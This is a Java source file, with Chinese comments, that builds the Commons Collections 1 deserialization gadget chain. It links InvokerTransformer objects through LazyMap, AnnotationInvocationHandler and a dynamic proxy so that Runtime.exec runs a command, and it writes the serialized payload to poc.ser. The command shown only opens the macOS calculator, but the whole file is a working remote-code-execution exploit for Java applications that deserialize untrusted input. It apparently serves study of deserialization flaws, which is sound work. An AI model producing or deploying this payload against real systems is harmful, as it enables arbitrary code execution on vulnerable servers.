import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

import java.lang.annotation.Retention;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CommonCollections1Test4 {
    public static void main(String[] args) throws Exception {
        // 要执行的命令
        String cmd = "open -a /System/Applications/Calculator.app";

        //构建一个 transformers 的数组,在其中构建了任意函数执行的核心代码
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{cmd}
                )
        };

        // 将 transformers 数组存入 ChaniedTransformer 这个继承类
        Transformer transformerChain = new ChainedTransformer(transformers);

        // 创建个 Map 准备拿来绑定 transformerChina
        Map innerMap = new HashMap();

        // 创建个 transformerChina 并绑定 innerMap
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        // 反射机制调用AnnotationInvocationHandler类的构造函数
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = clazz.getDeclaredConstructor(Class.class, Map.class);
        ctor.setAccessible(true);

        // 使用jdk动态代理
        InvocationHandler handler = (InvocationHandler) ctor.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);

        // 获取 AnnotationInvocationHandler 类实例
        Object instance = ctor.newInstance(Retention.class, proxyMap);

        // 保存反序列化文件
        FileOutputStream f = new FileOutputStream("poc.ser");
        ObjectOutputStream out = new ObjectOutputStream(f);
        out.writeObject(instance);

        System.out.println("执行完毕");
    }
}